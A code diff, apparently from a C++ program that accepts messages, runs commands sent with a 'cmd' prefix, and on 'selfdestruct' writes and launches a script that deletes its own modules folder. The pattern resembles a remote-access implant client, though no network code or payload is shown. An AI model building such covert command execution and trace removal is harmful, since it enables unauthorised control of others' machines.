@@ -15,18 +15,18 @@ ReturnData processMessage(const std::string& message) {
     ReturnData result;
 	if (message.length() > 2 && message.substr(0, 3) == "cmd") {
         result = exec(message.substr(4));
-        switch (result.result) {
-        case StatusCode::SUCCESS:
-            std::cout << "Success" << std::endl;
-            break;
-        case StatusCode::FAILURE:
-            std::cout << "Failure" << std::endl;
-        }
 	}
-    if (message == "selfdestruct") {
-        if (selfDestruct()) {
-            std::cout << "Self destruction failed";
+    else if (message == "selfdestruct") {
+        if (selfDestruct() == 1) {
+            std::cout << "Self destruction failed" << std::endl;
+            result = { StatusCode::FAILURE, "Self destruction failed" };
         };
+    }
+    else if (message.length() > 2 && message.substr(0, 3) == "lib") {
+        result = { StatusCode::SUCCESS, message.substr(4) };
+    }
+    else {
+        result = { StatusCode::FAILURE, "Commands doesnt fit pattern: " + message };
     }
     return result;
 }
@@ -67,7 +67,7 @@ static int selfDestruct() {
 
     currentDir = fso.GetParentFolderName(WScript.ScriptFullName)
 
-    moduleFolder = currentDir & "\Modules"
+    moduleFolder = currentDir & "\modules"
 
     If fso.FolderExists(moduleFolder) Then
         Set folder = fso.GetFolder(moduleFolder)
@@ -126,6 +126,7 @@ static int selfDestruct() {
     }
     else {
         std::cerr << "Error opening the file for writing!" << std::endl;
+        return 1;
     }
     system(".\\" SELFDESTRUCT_NAME);
 
